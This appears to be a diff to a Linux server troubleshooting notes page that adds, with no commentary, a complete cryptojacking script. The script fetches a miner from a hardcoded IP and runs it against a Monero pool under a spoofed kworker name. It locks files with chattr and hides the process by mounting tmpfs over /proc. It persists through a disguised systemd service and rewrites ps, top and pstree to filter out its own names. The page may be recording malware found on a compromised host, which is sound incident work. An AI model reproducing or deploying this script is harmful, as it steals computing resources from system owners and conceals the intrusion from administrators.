@@ -197,6 +197,149 @@ ps -p 进程ID -o pid,ppid,cmd,%mem,%cpu,start_time
 	yum reinstall e2fsprogs
 
 </code></pre>
+<p>shell脚本</p>
+<pre><code class="language-shell">MINER_URL="http://167.179.119.120/QiubA21m0n1en7u.ben"
+MINER_SIZE="7047392"
+MINER_BASE="/etc"
+DOWNLOADER="curl"
+
+download_file() {
+    local url="$1" output="$2" fallback_url="${3:-$MINER_URL}" tmpfile="${output}.tmp.$$"
+    rm -f "$tmpfile" 2&gt;/dev/null
+    case "$DOWNLOADER" in
+        curl)
+            curl --connect-timeout 30 --retry 3 --max-time 300 -o "$tmpfile" "$url" 2&gt;/dev/null ||             curl --connect-timeout 30 --retry 3 --max-time 300 -o "$tmpfile" "$fallback_url" 2&gt;/dev/null
+            ;;
+        wget)
+            wget --timeout=30 --tries=3 -O "$tmpfile" "$url" 2&gt;/dev/null ||             wget --timeout=30 --tries=3 -O "$tmpfile" "$fallback_url" 2&gt;/dev/null
+            ;;
+        python3|python)
+            "$DOWNLOADER" -c "
+import urllib.request
+for u in ['$url', '$fallback_url']:
+    try:
+        urllib.request.urlretrieve(u, '$tmpfile')
+        if __import__('os').path.getsize('$tmpfile') &gt; 0: raise SystemExit(0)
+    except Exception: continue
+raise SystemExit(1)
+" 2&gt;/dev/null
+            ;;
+        *) return 1 ;;
+    esac
+    [ -s "$tmpfile" ] &amp;&amp; mv "$tmpfile" "$output" 2&gt;/dev/null &amp;&amp; return 0
+    rm -f "$tmpfile" 2&gt;/dev/null
+    return 1
+}
+
+check_and_restore_miner() {
+    local miner_path="$MINER_BASE/zzh"
+    local fsize
+    fsize=$(stat -c%s "$miner_path" 2&gt;/dev/null || wc -c &lt; "$miner_path" 2&gt;/dev/null)
+
+    if [ ! -f "$miner_path" ] || [ "$fsize" != "$MINER_SIZE" ]; then
+        chattr -i "$miner_path" 2&gt;/dev/null
+        rm -f "$miner_path" 2&gt;/dev/null
+        download_file "$MINER_URL" "$miner_path"
+        chmod 777 "$miner_path" 2&gt;/dev/null
+        chattr +i "$miner_path" 2&gt;/dev/null
+    fi
+
+    local running=false
+    for base in /etc /tmp; do
+        if [ -f "$base/.zzh.pid" ]; then
+            local spid
+            spid=$(cat "$base/.zzh.pid" 2&gt;/dev/null)
+            if [ -n "$spid" ] &amp;&amp; kill -0 "$spid" 2&gt;/dev/null; then
+                local exe_link
+                exe_link=$(readlink -f "/proc/$spid/exe" 2&gt;/dev/null || readlink "/proc/$spid/exe" 2&gt;/dev/null)
+                if [ -n "$exe_link" ] &amp;&amp; echo "$exe_link" | grep -q "/zzh$"; then
+                    running=true; break
+                fi
+            fi
+            rm -f "$base/.zzh.pid" 2&gt;/dev/null
+        fi
+    done
+    if ! $running; then
+        for pexe in /proc/[0-9]*/exe; do
+            local exe_link
+            exe_link=$(readlink -f "$pexe" 2&gt;/dev/null || readlink "$pexe" 2&gt;/dev/null)
+            if [ -n "$exe_link" ] &amp;&amp; echo "$exe_link" | grep -q "/zzh$"; then
+                running=true; break
+            fi
+        done
+    fi
+
+    if [ -f "$miner_path" ] &amp;&amp; ! $running; then
+        cd "$MINER_BASE" || return
+
+        local spoof_name="[kworker/$((RANDOM % 8)):$((RANDOM % 256))]"
+        bash -c "exec -a \"${spoof_name}\" ./$(basename \"$miner_path\") -o stratum+tcp://auto.c3pool.org:19999             -u 457KQKqFtyg9WtcHQdvok4N6uRZstLmPzFrPv2ewNjHeSRP1MyFFw2zHHjCpm7JoYgMGSpwCwfK9PXXd4nsXQ7Hm9AXofmi             -p Gear" &amp;
+
+        sleep 4
+
+        for piddir in /proc/[0-9]*/; do
+            local epid="${piddir%/}"; epid="${epid##*/}"
+            local exe_link
+            exe_link=$(readlink -f "$piddir/exe" 2&gt;/dev/null || readlink "$piddir/exe" 2&gt;/dev/null)
+            if [ -n "$exe_link" ] &amp;&amp; echo "$exe_link" | grep -q "/zzh$"; then
+                echo "$epid" &gt; "$MINER_BASE/.zzh.pid" 2&gt;/dev/null
+                chattr +i "$MINER_BASE/.zzh.pid" 2&gt;/dev/null
+                mount -t tmpfs tmpfs "/proc/$epid" 2&gt;/dev/null
+                break
+            fi
+        done
+    fi
+}
+
+check_and_restart_service() {
+    local sctl="systemctl"
+    [ ! -w "/etc" ] &amp;&amp; sctl="systemctl --user"
+    if ! $sctl is-active --quiet systemd-jourhold.service 2&gt;/dev/null; then
+        $sctl daemon-reload 2&gt;/dev/null
+        $sctl enable systemd-jourhold.service 2&gt;/dev/null
+        $sctl start systemd-jourhold.service 2&gt;/dev/null
+    fi
+}
+
+check_hide_commands() {
+    local binmap="$HIDE_DIR/binmap"
+    [ "$MINER_BASE" = "/tmp" ] &amp;&amp; binmap="/tmp/.X10-unix/.hide/binmap"
+
+    for bin in ps top pstree; do
+        local wrapper_path orig_path
+        wrapper_path=$(command -v "$bin" 2&gt;/dev/null)
+        [ -z "$wrapper_path" ] &amp;&amp; continue
+
+        wrapper_path=$(readlink -f "$wrapper_path" 2&gt;/dev/null || realpath "$wrapper_path" 2&gt;/dev/null || echo "$wrapper_path")
+
+        orig_path=$(grep "^${bin}:" "$binmap" 2&gt;/dev/null | head -1 | cut -d: -f2)
+
+        if [ -n "$orig_path" ] &amp;&amp; [ -f "$orig_path" ]; then
+            if file "$wrapper_path" 2&gt;/dev/null | grep -q "ELF"; then
+                mv "$wrapper_path" "$orig_path" 2&gt;/dev/null
+                local orig_mode=$(stat -c%a "$orig_path" 2&gt;/dev/null || echo "755")
+                printf '#!/bin/bash\n# GNU %s — system process inspector (coreutils)\nexec "%s" "$@" | grep -v "zzh\\|pnscan"\n' "$bin" "$orig_path" &gt; "$wrapper_path"
+                chmod "$orig_mode" "$wrapper_path" 2&gt;/dev/null || chmod 755 "$wrapper_path" 2&gt;/dev/null
+            fi
+            chattr +i "$wrapper_path" 2&gt;/dev/null
+            chattr +i "$orig_path" 2&gt;/dev/null
+        else
+            if [ -f "$wrapper_path" ] &amp;&amp; ! file "$wrapper_path" 2&gt;/dev/null | grep -q "ELF"; then
+                if ! grep -q "grep.*zzh" "$wrapper_path" 2&gt;/dev/null; then
+                    printf '#!/bin/bash\nexec "%s" "$@" | grep -v "zzh\\|pnscan"\n' "${wrapper_path}.orig" &gt; "$wrapper_path.tmp" 2&gt;/dev/null &amp;&amp; mv "$wrapper_path.tmp" "$wrapper_path" 2&gt;/dev/null
+                fi
+            fi
+        fi
+    done
+}
+
+while true; do
+    check_and_restore_miner
+    check_and_restart_service
+    check_hide_commands
+    sleep 60
+done
+</code></pre>
 
                     </main>
 
